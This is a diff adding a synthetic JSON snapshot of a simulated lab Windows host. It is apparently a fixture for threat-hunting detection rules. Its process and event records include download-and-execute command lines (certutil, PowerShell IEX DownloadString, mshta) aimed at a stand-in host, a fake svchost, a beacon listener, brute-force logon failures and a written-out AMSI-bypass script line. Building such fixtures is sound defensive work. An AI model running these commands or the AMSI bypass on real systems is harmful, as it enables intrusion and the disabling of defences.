@@ -1,0 +1,620 @@
+{
+  "schemaVersion": 1,
+  "kind": "WthSnapshot",
+  "synthetic": true,
+  "description": "SIMULATED lab host showing a document-to-PowerShell execution chain, failed logons, and gaps in coverage (no Sysmon, no elevation). Synthetic data, not collected from a real endpoint.",
+  "host": "WS-LAB-03",
+  "collectedAt": "2026-10-16T09:30:00.000Z",
+  "redacted": false,
+  "tool": {
+    "Name": "WindowsThreatHunter",
+    "Version": "synthetic-sample"
+  },
+  "platform": {
+    "OperatingSystem": "SYNTHETIC (not a real system)",
+    "PowerShellVersion": "5.1 (simulated)",
+    "PowerShellEdition": "Desktop",
+    "Elevated": false
+  },
+  "environment": {
+    "SystemRoot": "C:\\Windows",
+    "windir": "C:\\Windows",
+    "SystemDrive": "C:",
+    "ProgramFiles": "C:\\Program Files",
+    "ProgramFiles(x86)": "C:\\Program Files (x86)",
+    "ProgramData": "C:\\ProgramData",
+    "ALLUSERSPROFILE": "C:\\ProgramData"
+  },
+  "coverage": [
+    {
+      "DataSource": "ScheduledTask",
+      "Collector": "ScheduledTasks",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "Service",
+      "Collector": "Services",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "RegistryRun",
+      "Collector": "RegistryRun",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "StartupItem",
+      "Collector": "StartupFolders",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "WmiSubscription",
+      "Collector": "WmiSubscriptions",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "Yes",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "LocalAccount",
+      "Collector": "LocalAccounts",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "LocalGroupMember",
+      "Collector": "LocalAccounts",
+      "Status": "NotRequested",
+      "ItemCount": 0,
+      "RequiresElevation": "No",
+      "Message": "Collector was not selected for this synthetic lab scenario. Rules for this source were not evaluated."
+    },
+    {
+      "DataSource": "Process",
+      "Collector": "Processes",
+      "Status": "Collected",
+      "ItemCount": 10,
+      "RequiresElevation": "No",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "NetworkConnection",
+      "Collector": "Network",
+      "Status": "Collected",
+      "ItemCount": 4,
+      "RequiresElevation": "No",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "DefenderStatus",
+      "Collector": "Defender",
+      "Status": "Collected",
+      "ItemCount": 1,
+      "RequiresElevation": "No",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "DefenderExclusion",
+      "Collector": "Defender",
+      "Status": "NeedsElevation",
+      "ItemCount": 0,
+      "RequiresElevation": "Yes",
+      "Message": "Defender exclusions are only visible to administrators. Re-run elevated to collect them; exclusion rules were not evaluated."
+    },
+    {
+      "DataSource": "DefenderEvent",
+      "Collector": "Defender",
+      "Status": "Collected",
+      "ItemCount": 2,
+      "RequiresElevation": "Maybe",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "Event.Security",
+      "Collector": "SecurityEvents",
+      "Status": "Collected",
+      "ItemCount": 13,
+      "RequiresElevation": "Yes",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "Event.PowerShell",
+      "Collector": "PowerShellEvents",
+      "Status": "Collected",
+      "ItemCount": 1,
+      "RequiresElevation": "Maybe",
+      "Message": "Synthetic data."
+    },
+    {
+      "DataSource": "Event.Sysmon",
+      "Collector": "SysmonEvents",
+      "Status": "Unavailable",
+      "ItemCount": 0,
+      "RequiresElevation": "Maybe",
+      "Message": "Not available on this system: Sysmon is not installed or its Operational log does not exist. Rules for this source were not evaluated."
+    }
+  ],
+  "items": {
+    "Process": [
+      {
+        "ProcessId": 6000,
+        "ParentProcessId": 3300,
+        "Name": "WINWORD.EXE",
+        "ExecutablePath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\labuser\\Downloads\\invoice.docm\"",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:20:00.000Z",
+        "Owner": null,
+        "ParentName": "explorer.exe",
+        "ParentExecutablePath": "C:\\Windows\\explorer.exe",
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6100,
+        "ParentProcessId": 6000,
+        "Name": "cmd.exe",
+        "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:21:00.000Z",
+        "Owner": null,
+        "ParentName": "WINWORD.EXE",
+        "ParentExecutablePath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6200,
+        "ParentProcessId": 6100,
+        "Name": "powershell.exe",
+        "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:21:00.000Z",
+        "Owner": null,
+        "ParentName": "cmd.exe",
+        "ParentExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6300,
+        "ParentProcessId": 6200,
+        "Name": "certutil.exe",
+        "ExecutablePath": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.50/payload.bin C:\\Users\\labuser\\AppData\\Local\\Temp\\p.bin",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:22:00.000Z",
+        "Owner": null,
+        "ParentName": "powershell.exe",
+        "ParentExecutablePath": null,
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6400,
+        "ParentProcessId": 6200,
+        "Name": "svchost.exe",
+        "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\svchost.exe",
+        "CommandLine": "svchost.exe",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:23:00.000Z",
+        "Owner": null,
+        "ParentName": "powershell.exe",
+        "ParentExecutablePath": null,
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6500,
+        "ParentProcessId": 6200,
+        "Name": "powershell.exe",
+        "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')\"",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:24:00.000Z",
+        "Owner": null,
+        "ParentName": "powershell.exe",
+        "ParentExecutablePath": null,
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 6600,
+        "ParentProcessId": 6200,
+        "Name": "mshta.exe",
+        "ExecutablePath": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe http://203.0.113.50/a.hta",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:25:00.000Z",
+        "Owner": null,
+        "ParentName": "powershell.exe",
+        "ParentExecutablePath": null,
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 4400,
+        "ParentProcessId": 3300,
+        "Name": "chrome.exe",
+        "ExecutablePath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T07:00:00.000Z",
+        "Owner": null,
+        "ParentName": "explorer.exe",
+        "ParentExecutablePath": "C:\\Windows\\explorer.exe",
+        "ParentReliable": true
+      },
+      {
+        "ProcessId": 3300,
+        "ParentProcessId": 3000,
+        "Name": "explorer.exe",
+        "ExecutablePath": "C:\\Windows\\explorer.exe",
+        "CommandLine": "C:\\Windows\\Explorer.EXE",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T07:00:00.000Z",
+        "Owner": null,
+        "ParentName": null,
+        "ParentExecutablePath": null,
+        "ParentReliable": false
+      },
+      {
+        "ProcessId": 6700,
+        "ParentProcessId": 6400,
+        "Name": "beacon.exe",
+        "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\beacon.exe",
+        "CommandLine": "beacon.exe --listen 4444",
+        "CommandLineAvailable": true,
+        "CreationTime": "2026-10-16T08:30:00.000Z",
+        "Owner": null,
+        "ParentName": "svchost.exe",
+        "ParentExecutablePath": null,
+        "ParentReliable": true
+      }
+    ],
+    "NetworkConnection": [
+      {
+        "Protocol": "TCP",
+        "State": "Established",
+        "LocalAddress": "10.20.0.31",
+        "LocalPort": 50123,
+        "RemoteAddress": "203.0.113.50",
+        "RemotePort": 443,
+        "OwningProcess": 6600,
+        "ProcessName": "mshta.exe",
+        "ProcessPath": "C:\\Windows\\System32\\mshta.exe",
+        "IsListening": false,
+        "LocalIsLoopback": false,
+        "RemoteIsPublic": true
+      },
+      {
+        "Protocol": "TCP",
+        "State": "Established",
+        "LocalAddress": "10.20.0.31",
+        "LocalPort": 50150,
+        "RemoteAddress": "198.51.100.77",
+        "RemotePort": 8443,
+        "OwningProcess": 6400,
+        "ProcessName": "svchost.exe",
+        "ProcessPath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\svchost.exe",
+        "IsListening": false,
+        "LocalIsLoopback": false,
+        "RemoteIsPublic": true
+      },
+      {
+        "Protocol": "TCP",
+        "State": "Established",
+        "LocalAddress": "10.20.0.31",
+        "LocalPort": 50160,
+        "RemoteAddress": "203.0.113.80",
+        "RemotePort": 443,
+        "OwningProcess": 4400,
+        "ProcessName": "chrome.exe",
+        "ProcessPath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "IsListening": false,
+        "LocalIsLoopback": false,
+        "RemoteIsPublic": true
+      },
+      {
+        "Protocol": "TCP",
+        "State": "Listen",
+        "LocalAddress": "0.0.0.0",
+        "LocalPort": 4444,
+        "RemoteAddress": "0.0.0.0",
+        "RemotePort": 0,
+        "OwningProcess": 6700,
+        "ProcessName": "beacon.exe",
+        "ProcessPath": "C:\\Users\\labuser\\AppData\\Local\\Tool\\beacon.exe",
+        "IsListening": true,
+        "LocalIsLoopback": false,
+        "RemoteIsPublic": false
+      }
+    ],
+    "DefenderStatus": [
+      {
+        "AMRunningMode": "Normal",
+        "AntivirusEnabled": true,
+        "AMServiceEnabled": true,
+        "RealTimeProtectionEnabled": false,
+        "BehaviorMonitorEnabled": true,
+        "IoavProtectionEnabled": true,
+        "IsTamperProtected": true,
+        "AntivirusSignatureAgeDays": 9,
+        "AntivirusSignatureLastUpdated": "2026-10-07T09:00:00.000Z"
+      }
+    ],
+    "DefenderEvent": [
+      {
+        "Channel": "Microsoft-Windows-Windows Defender/Operational",
+        "EventId": 5001,
+        "TimeCreated": "2026-10-16T09:18:00.000Z",
+        "Provider": "Microsoft-Windows-Windows Defender",
+        "Computer": "WS-LAB-03",
+        "RecordId": 12001,
+        "Data": {
+          "ProductName": "Microsoft Defender Antivirus",
+          "ProductVersion": "4.18.24090.11"
+        }
+      },
+      {
+        "Channel": "Microsoft-Windows-Windows Defender/Operational",
+        "EventId": 1116,
+        "TimeCreated": "2026-10-16T09:22:00.000Z",
+        "Provider": "Microsoft-Windows-Windows Defender",
+        "Computer": "WS-LAB-03",
+        "RecordId": 8116,
+        "Data": {
+          "ThreatName": "Trojan:Win32/SyntheticLab.A",
+          "SeverityName": "Severe",
+          "CategoryName": "Trojan",
+          "Path": "file:_C:\\Users\\labuser\\AppData\\Local\\Temp\\p.bin",
+          "ProcessName": "C:\\Windows\\System32\\certutil.exe",
+          "DetectionUser": "WS-LAB-03\\labuser"
+        }
+      }
+    ],
+    "Event.Security": [
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:02:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1000,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:02:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1001,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:03:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1002,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:03:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1003,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:04:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1004,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:04:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1005,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:05:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1006,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:05:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1007,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:06:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1008,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:06:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1009,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:07:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1010,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 4625,
+        "TimeCreated": "2026-10-16T09:07:00.000Z",
+        "Provider": "Microsoft-Windows-Security-Auditing",
+        "Computer": "WS-LAB-03",
+        "RecordId": 1011,
+        "Data": {
+          "TargetUserName": "labuser",
+          "TargetDomainName": "WS-LAB-03",
+          "IpAddress": "198.51.100.23",
+          "LogonType": "3",
+          "Status": "0xc000006d",
+          "SubStatus": "0xc000006a",
+          "WorkstationName": "KALI-LAB"
+        }
+      },
+      {
+        "Channel": "Security",
+        "EventId": 1102,
+        "TimeCreated": "2026-10-16T09:27:00.000Z",
+        "Provider": "Microsoft-Windows-Eventlog",
+        "Computer": "WS-LAB-03",
+        "RecordId": 3050,
+        "Data": {
+          "SubjectUserName": "labuser",
+          "SubjectDomainName": "WS-LAB-03"
+        }
+      }
+    ],
+    "Event.PowerShell": [
+      {
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "EventId": 4104,
+        "TimeCreated": "2026-10-16T09:21:00.000Z",
+        "Provider": "Microsoft-Windows-PowerShell",
+        "Computer": "WS-LAB-03",
+        "RecordId": 9004,
+        "Data": {
+          "MessageNumber": "1",
+          "MessageTotal": "1",
+          "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+          "ScriptBlockId": "00000000-0000-0000-0000-000000000004",
+          "Path": ""
+        }
+      }
+    ]
+  }
+}
